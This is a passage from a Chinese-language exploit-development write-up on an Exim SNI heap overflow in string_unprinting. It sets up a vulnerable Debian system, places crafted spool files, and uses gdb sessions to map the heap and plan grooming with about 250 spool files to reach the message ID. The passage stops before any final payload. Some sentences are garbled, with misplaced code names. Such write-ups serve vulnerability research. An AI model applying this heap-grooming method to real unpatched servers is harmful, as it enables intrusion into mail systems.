-Mc`，也可以在`exim -q`之后使用到。第一个对应于接收时的直接消息传递，第二个对应于队列运行进程调用后台任务时。
为了攻击这个漏洞，我们把目标定在了队列运行进程。因为在这个进程中，exim -q时，message ID存储在一个堆中，当发送程序使用`exim -Mc`
，message存储在栈中。
问题是，这两个晋城市Exim守护进程的fork和exec，除了读取spool假脱机文件以外没有任何交互，所以比利用CVE-2018-6789更难。
### PoC漏洞开发
为了复现这个漏洞，需要安装一个老版本的debian 9，就像在发布修复版本之前在快照库中保存的那样。
    root@strech:~# cat /etc/apt/sources.list
    deb     http://snapshot.debian.org/archive/debian/20190801T025637Z/ stretch main
    deb-src http://snapshot.debian.org/archive/debian/20190801T025637Z/ stretch main
注意自从2017年，GNUTLS添加了新的SNI值检查。那就是说，当Exim连接到GUNTLS的版本大于3.6.0时，漏洞不再可被利用。
为了简单的测试一下漏洞，需要创建两个文件，手动运行Exim的队列。
    cp 1i7Jgy-0002dD-Pb-D /var/spool/exim4/1i7Jgy-0002dD-Pb-D
    cp 1i7Jgy-0002dD-Pb-H /var/spool/exim4/1i7Jgy-0002dD-Pb-H
    /usr/sbin/exim4 -q
然后，在 `string_unprinting` 下入断点，可能使得：
  * 确保能够出发溢出缓冲区
  * 在堆溢出时的形态
  * 查找堆中的message ID
    gdb --args /usr/sbin/exim4 -q
    gef➤  set follow-fork-mode child
    gef➤  b string_unprinting
    Breakpoint 1 at 0x5600d5924540: file string.c, line 355.
    gef➤  r
    Thread 2.1 "exim4" hit Breakpoint 1, string_unprinting (s=0x562b1a097790 "abcdef\\") at string.c:355
    gef➤  n
    [... step until interesting stuff ...]
    gef➤  p s
    $1 = (uschar *) 0x562b1a097790 "abcdef\\"
    gef➤  p len
    $2 = 0x8
    gef➤  p ss
    $4 = (uschar *) 0x562b1a097798 ""
    gef➤  heap chunks
    [... skip uninteresting chunks ...]
    Chunk(addr=0x562b1a0975e0, size=0x2020, flags=PREV_INUSE)
        [0x0000562b1a0975e0     00 00 00 00 00 00 00 00 00 20 00 00 00 00 00 00    ......... ......]
    Chunk(addr=0x562b1a099600, size=0x1010, flags=PREV_INUSE)
        [0x0000562b1a099600     31 69 37 4a 67 79 2d 30 30 30 32 64 44 2d 50 62    1i7Jgy-0002dD-Pb]
    Chunk(addr=0x562b1a09a610, size=0x1fa00, flags=PREV_INUSE)  ←  top chunk
输入和输出缓冲都在0x2020字节的chunk中。后面的chunk（0x1010）在当读取头文件时开始被分配。没有明显可被用于代码执行的地方。 fgets
现在我们可以查找message ID：
    gef➤  grep 1i7Jgy-0002dD-Pb
    [+] Searching '1i7Jgy-0002dD-Pb' in memory
    [+] In (0x562b1a009000-0x562b1a00d000), permission=rw-      0x562b1a00abb1 - 0x562b1a00abd6  →   "1i7Jgy-0002dD-Pb (queue run pid 2860)" 
      0x562b1a00ae92 - 0x562b1a00aea2  →   "1i7Jgy-0002dD-Pb" 
    [+] In '[heap]'(0x562b1a05a000-0x562b1a0ba000), permission=rw-      0x562b1a097609 - 0x562b1a097619  →   "1i7Jgy-0002dD-Pb" 
      0x562b1a097641 - 0x562b1a097653  →   "1i7Jgy-0002dD-Pb-H" 
      0x562b1a097663 - 0x562b1a097688  →   "1i7Jgy-0002dD-Pb (queue run pid 2860)" 
      0x562b1a0976a9 - 0x562b1a0976bb  →   "1i7Jgy-0002dD-Pb-D" 
      0x562b1a0976c0 - 0x562b1a0976d2  →   "1i7Jgy-0002dD-Pb-H" 
      0x562b1a0976f1 - 0x562b1a097703  →   "1i7Jgy-0002dD-Pb-H" 
      0x562b1a099600 - 0x562b1a099637  →   "1i7Jgy-0002dD-Pb-H\nDebian-exim 103 114\n\n022F From: redacted@re[...]" 
    [+] In '[stack]'(0x7fff8da2e000-0x7fff8dab0000), permission=rw-      0x7fff8da65ae9 - 0x7fff8da65afb  →   "1i7Jgy-0002dD-Pb-H" 
      0x7fff8da65bb0 - 0x7fff8da65bc2  →   "1i7Jgy-0002dD-Pb-H" 
      0x7fff8da65eb9 - 0x7fff8da65ecb  →   "1i7Jgy-0002dD-Pb-H"
此时，唯一可用于覆写文件的消息ID在堆中，但在输出缓冲区溢出时，不能到达。
最后，发现了确保溢出正常执行。
    gef➤  fin
    Run till exit from #0  string_unprinting (s=0x5600d6a60790 "abcdef\\") at string.c:366
    gef➤  x/16bx 0x5600d6a60798
    0x5600d6a60798: 0x61    0x62    0x63    0x64    0x65    0x66    0x00    0x61
    0x5600d6a607a0: 0x62    0x63    0x64    0x65    0x66    0x00    0x00    0x00
我们可以看到输入的8字符被复制了2次。
### 形成堆的利用地址
为了找到可行的利用方法，需要在队列运行器到达漏洞时堆的详细状态分析。主要的想法是整形堆的形状以便于输入缓冲区和输出缓冲区都被分配在先前的释放的chunk中，实现攻击。目的是在缓冲区溢出时，可以到达message
ID。要这样做，释放的chunk块`STORE_BLOCK_SIZE`最小分配空间值是0x2000字节。
big_buffer
是用于存储临时的假脱机文件的缓冲区，是一个很好的目标。如果碰上它被重新分配的话，那么堆中的相当一个大的chunk块将被释放。但不碰巧，我们没有遇上，因为在exim的处理再分配的机制中不会释放旧的文件。`big_buffer`
    while (  (len = Ustrlen(big_buffer)) == big_buffer_size-1
        && big_buffer[len-1] != '\n'
        )
        {   /* buffer not big enough for line; certs make this possible */
        uschar * buf;
        if (big_buffer_size >= BIG_BUFFER_SIZE*4) goto SPOOL_READ_ERROR;
        buf = store_get_perm(big_buffer_size *= 2);
        memcpy(buf, big_buffer, --len);
        big_buffer = buf;
        if (Ufgets(big_buffer+len, big_buffer_size-len, f) == NULL)
          goto SPOOL_READ_ERROR;
        }
当队列运行进程遍历spool文件时，会分配一个大小为0x8030的chunk内部缓冲区，当释放的时候就会调用。`queue_get_spool_lis`
因此，如果能够确保有足够的文件能够强制分配，那么就可以在堆中创建一个gap。`storeblock/var/spool/exim4/input/`
仍然可以找到剩余的空间大小。`current_block[0]` `yield_length[0]`
    gef➤  b opendir
    Breakpoint 1 at 0x55b87b85e468
    gef➤  c
    Continuing.
    Breakpoint 1, 0x00007f81aebc49a0 in opendir () from target:/lib/x86_64-linux-gnu/libc.so.6
    gef➤  p yield_length[0]
    $1 = 0x1ff0
需要至少创建250个spool脱机文件，就能够足够确保测试场景中创建我们的gap。间隔之后的数据会恰好是用于创建日志文件的message ID。
    gef➤  b closedir
    Breakpoint 1 at 0x55dcb4d13898
    gef➤  c
    Continuing.
    Breakpoint 1, 0x00007fb8affcc9f0 in closedir () from target:/lib/x86_64-linux-gnu/libc.so.6
    gef➤  fin
    Run till exit from #0  0x00007fb8affcc9f0 in closedir () from target:/lib/x86_64-linux-gnu/libc.so.6
    gef➤  heap chunks
    [... skip uninteresting chunks ...]
    Chunk(addr=0x55dcb6d6d5e0, size=0x2020, flags=PREV_INUSE)
        [0x000055dcb6d6d5e0     40 76 d7 b6 dc 55 00 00 00 20 00 00 00 00 00 00    @v...U... ......]
    Chunk(addr=0x55dcb6d6f600, size=0x8040, flags=PREV_INUSE)
        [0x000055dcb6d6f600     58 2b 2b b0 b8 7f 00 00 58 2b 2b b0 b8 7f 00 00    X++.....X++.....]
    Chunk(addr=0x55dcb6d77640, size=0x2020, flags=)
        [0x000055dcb6d77640     00 00 00 00 00 00 00 00 00 20 00 00 00 00 00 00    ......... ......]
    Chunk(addr=0x55dcb6d79660, size=0x1e9b0, flags=PREV_INUSE)  ←  top chunk
为了完成攻击漏洞，需要确保SNI分配gap，需要我们填充一些东西，以便再分配SNI时可以得到一个新的存储空间。`current_block[0]`
断入并计算剩余空间。`string_unprinting` `current_block[0]`
    gef➤  b string_unprinting
    Breakpoint 1 at 0x55d401799540: file string.c, line 355.
    gef➤  c
    Continuing.
    Thread 2.1 "exim4" hit Breakpoint 3, string_unprinting (s=0x55d4039d6990 'a' , "\\") at string.c:355